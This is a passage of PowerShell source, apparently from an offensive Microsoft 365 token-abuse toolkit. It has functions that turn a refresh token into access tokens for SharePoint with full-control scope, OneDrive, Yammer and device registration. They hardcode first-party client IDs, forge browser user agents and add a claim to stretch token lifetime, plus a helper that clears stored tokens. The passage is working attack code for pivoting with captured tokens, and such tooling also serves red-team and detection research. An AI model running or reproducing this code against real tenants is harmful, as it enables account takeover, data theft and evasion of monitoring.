    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://$SharePointTenantName$AdminSuffix.sharepoint.com/Sites.FullControl.All offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:SharePointToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$SharePointToken"
        $SharePointToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}
function Invoke-RefreshToOneDriveToken {
    <#
    .DESCRIPTION
        Generate a OneDrive token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToOneDriveToken -domain myclient.org -refreshToken ey....
        $OneDriveToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientID = "ab9b8c07-8f02-4f72-87fa-80105867a763",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://officeapps.live.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:OneDriveToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$OneDriveToken"
        $OneDriveToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToYammerToken {
    <#
    .DESCRIPTION
        Generate a Yammer access token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToYammerToken -domain myclient.org -refreshToken ey....
        $YammerToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://api.spaces.skype.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:YammerToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$YammerToken"
        $YammerToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToDeviceRegistrationToken {
    <#
    .DESCRIPTION
        GGenerate an access token for the device registration service from a refresh token.
    .EXAMPLE
        Invoke-RefreshToDeviceRegistrationToken -domain myclient.org -refreshToken ey....
        $DeviceRegistrationToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "1b730954-1685-4b74-9bfd-dac224a7b894",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain        = $Domain
        refreshToken  = $refreshToken
        ClientID      = $ClientID
        Device        = $Device
        Browser       = $Browser
        UseCAE        = $UseCAE
        Scope         = "openid"
        Resource      = "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9"
        UseV1Endpoint = $true
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:DeviceRegistrationToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$DeviceRegistrationToken"
        $DeviceRegistrationToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToToken {
    [CmdletBinding()]
    param (
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $true)]
        [string]$refreshToken,
        [Parameter(Mandatory = $true)]
        [string]$ClientID,
        [Parameter(Mandatory = $true)]
        [string]$Scope,
        [Parameter(Mandatory = $false)]
        [string]$Resource,
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE,
        [Parameter(Mandatory = $False)]
        [Switch]$UseDoD,
        [Parameter(Mandatory = $False)]
        [Switch]$UseV1Endpoint

    )

    if ($CustomUserAgent) {
        $UserAgent = $CustomUserAgent
    } elseif ($Device) {
        if ($Browser) {
            $UserAgent = Get-ForgedUserAgent -Device $Device -Browser $Browser
        } else {
            $UserAgent = Get-ForgedUserAgent -Device $Device
        }
    } elseif ($Browser) {
        $UserAgent = Get-ForgedUserAgent -Browser $Browser
    } else {
        $UserAgent = Get-ForgedUserAgent
    }

    Write-Verbose "UserAgent: $UserAgent"

    $Headers = @{}
    $Headers["User-Agent"] = $UserAgent

    $TenantId = Get-TenantID -domain $domain
    if ($UseDoD) {
        $authUrl = "https://login.microsoftonline.us/$($TenantId)"
    } else {
        $authUrl = "https://login.microsoftonline.com/$($TenantId)"
    }


    Write-Verbose $refreshToken

    $body = @{
        "scope"         = $Scope
        "client_id"     = $ClientId
        "grant_type"    = "refresh_token"
        "refresh_token" = $refreshToken
    }

    if ($UseCAE) {
        # Add 'cp1' as client claim to get a access token valid for 24 hours
        $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
        $body.Add("claims", $Claims)
    }

    if ($Resource) {
        $body.Add("resource", $Resource)
    }

    Write-Verbose ( $body | ConvertTo-Json -Depth 99)

    if ($UseV1Endpoint) {
        $uri = "$($authUrl)/oauth2/token"
    } else {
        $uri = "$($authUrl)/oauth2/v2.0/token"
    }

    $Token = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $uri -Headers $Headers -Body $body
    Return $Token
}

function Clear-Token {
    <#
    .DESCRIPTION
        Clear your saved tokens
    .EXAMPLE
        Clear-Token -Token All
        Clear-Token -Token Substrate
    #>
    [CmdletBinding()]
    Param([Parameter(Mandatory = $true)]
        [ValidateSet("All", "Response", "Outlook", "MSTeams", "Graph", "AzureCoreManagement", "OfficeManagement", "MSGraph", "DODMSGraph", "Custom", "Substrate", "SharePoint", "OneDrive", "Yammer")]
        [string]$Token
    )
    if ($Token -eq "All") {
        # Remove variables from the global scope
        Remove-Variable -Scope Global -Name response -ErrorAction 0
        Remove-Variable -Scope Global -Name OutlookToken -ErrorAction 0
        Remove-Variable -Scope Global -Name MSTeamsToken -ErrorAction 0
        Remove-Variable -Scope Global -Name GraphToken -ErrorAction 0
        Remove-Variable -Scope Global -Name AzureCoreManagementToken -ErrorAction 0
        Remove-Variable -Scope Global -Name OfficeManagementToken -ErrorAction 0
        Remove-Variable -Scope Global -Name MSGraphToken -ErrorAction 0
        Remove-Variable -Scope Global -Name DODMSGraphToken -ErrorAction 0
        Remove-Variable -Scope Global -Name CustomToken -ErrorAction 0
        Remove-Variable -Scope Global -Name SubstrateToken -ErrorAction 0
        Remove-Variable -Scope Global -Name CustomToken -ErrorAction 0
        Remove-Variable -Scope Global -Name SharePointToken -ErrorAction 0
        Remove-Variable -Scope Global -Name YammerToken -ErrorAction 0
        Remove-Variable -Scope Global -Name DeviceRegistrationToken -ErrorAction 0
    } elseif ($Token -eq "Response") {
        Remove-Variable -Scope Global -Name response -ErrorAction 0
    } elseif ($Token -eq "Outlook") {
        Remove-Variable -Scope Global -Name OutlookToken -ErrorAction 0
    } elseif ($Token -eq "MSTeams") {
        Remove-Variable -Scope Global -Name MSTeamsToken -ErrorAction 0
    } elseif ($Token -eq "Graph") {
        Remove-Variable -Scope Global -Name GraphToken -ErrorAction 0
    } elseif ($Token -eq "AzureCoreManagement") {
        Remove-Variable -Scope Global -Name AzureCoreManagementToken -ErrorAction 0
    } elseif ($Token -eq "OfficeManagement") {
        Remove-Variable -Scope Global -Name OfficeManagementToken -ErrorAction 0
    } elseif ($Token -eq "MSGraph") {
        Remove-Variable -Scope Global -Name MSGraphToken -ErrorAction 0
    } elseif ($Token -eq "DODMSGraph") {
        Remove-Variable -Scope Global -Name DODMSGraphToken -ErrorAction 0
    } elseif ($Token -eq "Custom") {
        Remove-Variable -Scope Global -Name CustomToken -ErrorAction 0
    } elseif ($Token -eq "Substrate") {
        Remove-Variable -Scope Global -Name SubstrateToken -ErrorAction 0
    } elseif ( $Token -eq "SharePoint") {
        Remove-Variable -Scope Global -Name SharePointToken -ErrorAction 0
    } elseif ( $Token -eq "OneDrive") {
        Remove-Variable -Scope Global -Name OneDriveToken -ErrorAction 0
    } elseif ( $Token -eq "Yammer") {
        Remove-Variable -Scope Global -Name YammerToken -ErrorAction 0
    } elseif ( $Token -eq "DeviceRegistration") {
        Remove-Variable -Scope Global -Name DeviceRegistrationToken -ErrorAction 0
    } else {
        Write-Error "Token $Token not found"
    }
}
